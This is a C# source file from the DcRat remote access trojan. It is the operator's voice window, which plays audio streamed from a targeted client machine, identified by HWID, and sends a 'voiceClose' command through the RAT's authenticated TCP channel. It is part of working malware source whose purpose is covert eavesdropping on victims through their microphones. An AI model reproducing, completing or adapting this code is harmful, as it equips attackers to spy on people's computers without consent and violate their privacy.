using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DcRat.Properties;
using DcRat.TCPSocket;
using MessagePack;
using WaveLib;

namespace DcRat.singleForms
{
    public partial class singleFormVoice : Form
    {
        public string HWID { get; set; }
        public WinSoundPlayer _player;
        private int _soundBufferCount = 8;
        private int _dataBufferSize;
        public bool _isRun; 

        public singleFormVoice()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            SetTheme(); 
            Initialize();
        }
        #region Theme
        private void SetTheme()
        {
            bool darkTheme = Settings.Default.darkTheme;

            Color colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            Color colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            labelDcRat.BackColor = colorSide;
            labelDcRat.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;

        }
        #endregion

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion

        private void buttonclose_Click(object sender, EventArgs e)
        {
            if (HWID != null)
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "voiceClose";
                pack.ForcePathObject("TargetClient").AsString = HWID;

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
            if (_player != null)
                _player.Close();
            _isRun = false;
            Close();
        }

        private void Initialize()
        {
            _dataBufferSize = 1280;

            string waveOutDeviceName = WinSound.GetWaveOutDeviceNames().Count > 0 ? WinSound.GetWaveOutDeviceNames()[0] : null;

            if (waveOutDeviceName != null)
            {
                _player = new WinSoundPlayer();
                _player.Open(waveOutDeviceName, 44100, 16, 1, _dataBufferSize, _soundBufferCount);
            }
            else
            {
                MessageBox.Show("Can't find Wave Out Device!");
                Close();
            }

            _isRun = true;
        }
    }
}
